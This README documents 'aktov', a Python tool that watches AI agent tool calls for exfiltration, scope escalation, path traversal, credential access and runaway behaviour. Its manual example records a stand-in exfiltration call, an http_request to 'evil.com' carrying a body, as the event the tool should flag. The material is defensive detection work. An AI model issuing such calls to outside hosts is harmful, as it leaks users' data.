# aktov

[![PyPI version](https://img.shields.io/pypi/v/aktov.svg)](https://pypi.org/project/aktov/)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](https://github.com/sharmaharjeet92/aktov/blob/main/LICENSE)
[![Python 3.12+](https://img.shields.io/badge/python-3.12+-green.svg)](https://pypi.org/project/aktov/)

**Detection engineering for AI agents.**

`pip install aktov` — alerts when agents do weird or risky things.

*Every act, on record.*

## Quick Start

### Claude Code

```bash
pip install aktov
aktov init claude-code
# Done. Alerts appear in real-time during Claude Code sessions.
# Run `aktov report` to review after a session.
```

### OpenAI Agent SDK

```python
from agents import Agent, Runner
from aktov.integrations.openai_agents import AktovHooks

hooks = AktovHooks(aktov_agent_name="my-agent")
result = await Runner.run(agent, input="...", hooks=hooks)
response = hooks.end()
# response.alerts → [{"rule_id": "AK-010", "severity": "critical", ...}]
```

### LangChain

```python
from aktov.integrations.langchain import AktovCallback

cb = AktovCallback(aktov_agent_name="my-agent")
agent.invoke("do something", config={"callbacks": [cb]})
response = cb.end()
# response.alerts → [{"rule_id": "AK-010", "severity": "critical", ...}]
```

### MCP

```python
from aktov.integrations.mcp import wrap

traced = wrap(mcp_client, aktov_agent_name="my-agent")
result = await traced.call_tool("read_file", {"path": "/data/report.csv"})
response = traced.end_trace()
# response.alerts → [{"rule_id": "AK-010", "severity": "critical", ...}]
```

### Manual (any framework)

```python
from aktov import Aktov

ak = Aktov(agent_id="my-agent", agent_type="custom")
trace = ak.start_trace()
trace.record_action(tool_name="read_file", arguments={"path": "/data/report.csv"})
trace.record_action(tool_name="http_request", arguments={"url": "https://evil.com", "body": "..."})
response = trace.end()
# response.alerts → [{"rule_id": "AK-010", "severity": "critical", ...}]
```

No API key needed. Works immediately after `pip install aktov`.

**Want to see it in action first?** Try the [Detection Lab](https://github.com/sharmaharjeet92/aktov-labs) — 5 demos that show real attack detection in 30 seconds.

## Setup

Use `aktov init` to get framework-specific instructions:

```bash
aktov init claude-code      # writes hook config automatically
aktov init openai-agents    # prints code to add
aktov init langchain        # prints code to add
aktov init mcp              # prints code to add
aktov init custom           # prints manual API usage
```

## Connect to Cloud

Add an API key to unlock cross-trace correlation, dedup, webhooks, and the full ruleset:

```python
ak = Aktov(api_key="ak_...", agent_id="my-agent", agent_type="summarizer")
```

## What It Detects

Aktov monitors AI agent tool calls and detects anomalous behavior patterns:

- **Data exfiltration** — read followed by network egress to external domains
- **Capability escalation** — agents accessing tools outside their authorized scope
- **Path traversal** — `../` patterns in tool arguments (prompt injection indicator)
- **Credential abuse** — non-credential agents touching secrets/vaults
- **Runaway agents** — extreme chain lengths, burst failures, port scanning

## Features

- **Plug-and-play**: 1-2 lines to integrate with Claude Code, OpenAI Agent SDK, LangChain, MCP
- **Local rule evaluation**: `trace.end()` evaluates bundled rules instantly — no cloud needed
- **Near-zero latency**: hooks just append to memory — evaluation only runs at `.end()`
- **SAFE mode** (default): raw arguments never leave your machine — only semantic flags are extracted
- **Custom rules**: bring your own YAML detection rules via `rules_dir`
- **Cloud upgrade**: add `api_key` for cross-trace analysis, dedup, webhooks, dashboard

## CLI

```bash
# Set up for your framework
aktov init claude-code

# Review Claude Code session alerts
aktov report

# Scan trace files against detection rules (works offline)
aktov scan trace.json

# Preview what data would be transmitted
aktov preview --trace trace.json --mode safe
```

## Custom Rules

Load your own YAML detection rules instead of the bundled samples:

```python
ak = Aktov(agent_id="my-agent", agent_type="summarizer", rules_dir="./my-rules")
```

## SAFE vs DEBUG Mode

| | SAFE (default) | DEBUG |
|---|---|---|
| Raw arguments | Stripped client-side | Included |
| Semantic flags | Extracted and sent | Extracted and sent |
| Use case | Production | Development only |

## License

Apache-2.0
